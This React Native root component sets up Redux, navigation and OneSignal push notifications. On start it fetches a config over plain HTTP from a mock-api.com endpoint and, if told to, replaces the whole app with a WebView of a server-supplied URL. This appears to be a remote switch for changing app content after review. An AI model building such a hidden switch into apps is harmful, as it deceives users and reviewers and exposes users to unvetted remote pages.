import React from "react";

import {ImageBackground, Text, WebView, StatusBar} from "react-native";

import {createNavigationService} from "./navigation/NavigationService";

import OneSignal from 'react-native-onesignal';

const navigationService = createNavigationService();

let store;
let persistor;
let Navigator;
let PersistGate;
let Provider;

class NavigatorHolder extends React.Component {
	// componentDidMount() {
	// 	BackHandler.addEventListener("hardwareBackPress", this.onBackPress);
	// }
	//
	// componentWillUnmount() {
	// 	BackHandler.removeEventListener("hardwareBackPress", this.onBackPress);
	// }
	//
	// onBackPress = () => {
	// 	const {dispatch, state} = this.props;
	//
	// 	if (state.index === 0) {
	// 		return false;
	// 	} else {
	// 		dispatch(NavigationActions.back());
	// 		return true;
	// 	}
	// };

	setNavigator = navRef => {
		navigationService.setRootNavigator(navRef);
	};

	render() {
		return (
			<Navigator
				onNavigationStateChange={(...args) =>
					navigationService.onChangeNavigationState(...args)
				}
				ref={this.setNavigator}
				{...this.props}
			/>
		);
	}
}

const initStore = () => {
	const configureStore = require("./configureStore").default;
	const r = configureStore(navigationService);
	persistor = r.persistor;
	store = r.store;
};

const initNavigator = () => {
	Navigator = require("./navigation/AppNavigator").default;
	PersistGate = require("redux-persist/integration/react").PersistGate;
	Provider = require("react-redux").Provider;
};

export default class Root extends React.Component {
	state = {
    loaded: false,
    isWebViewEnabled: 0,
    webUri: null
  };
  
  constructor(properties) {
    super(properties);
    OneSignal.init("04c1b1fb-6bb6-4637-8403-c24f3b54fb2d");

    OneSignal.addEventListener('received', this.onReceived);
    OneSignal.addEventListener('opened', this.onOpened);
    OneSignal.addEventListener('ids', this.onIds);
  }

	componentDidMount() {
		initStore();
    initNavigator();
    StatusBar.setHidden(true);
    
    fetch("http://mock-api.com/Zn5aQwnj.mock/geturl", {
      method: 'GET'
    })
    .then(response => {
      return response.json()
    })
    .then((responseJson)=> {
      const { enable, url } = responseJson;

      if (enable) {
        isWebViewEnabled = 2;
      } else {
        isWebViewEnabled = 1;
      }

      this.setState({
        loaded: true,
        isWebViewEnabled,
        webUri: url
      })

    })
    .catch(error=> {
      console.log(error)
      this.setState({
        loaded: true,
        isWebViewEnabled: 1
      })
    })

  }
  
  componentWillUnmount() {
    OneSignal.removeEventListener('received', this.onReceived);
    OneSignal.removeEventListener('opened', this.onOpened);
    OneSignal.removeEventListener('ids', this.onIds);
  }

  onReceived(notification) {
    console.log("Notification received: ", notification);
  }

  onOpened(openResult) {
    console.log('Message: ', openResult.notification.payload.body);
    console.log('Data: ', openResult.notification.payload.additionalData);
    console.log('isActive: ', openResult.notification.isAppInFocus);
    console.log('openResult: ', openResult);
  }

  onIds(device) {
    console.log('Device info: ', device);
  }

	render() {
		return (
			<ImageBackground
				style={{
					flex: 1
				}}
				source={require("./img/background.png")}
			>
				{(this.state.loaded && this.state.isWebViewEnabled === 1) && (
					<Provider store={store}>
						<PersistGate persistor={persistor}>
							<NavigatorHolder />
						</PersistGate>
					</Provider>
				)}

        {
          (this.state.loaded && this.state.isWebViewEnabled === 2) && 
          <WebView
            source={{uri: this.state.webUri}}
          />
        }
			</ImageBackground>
		);
	}
}
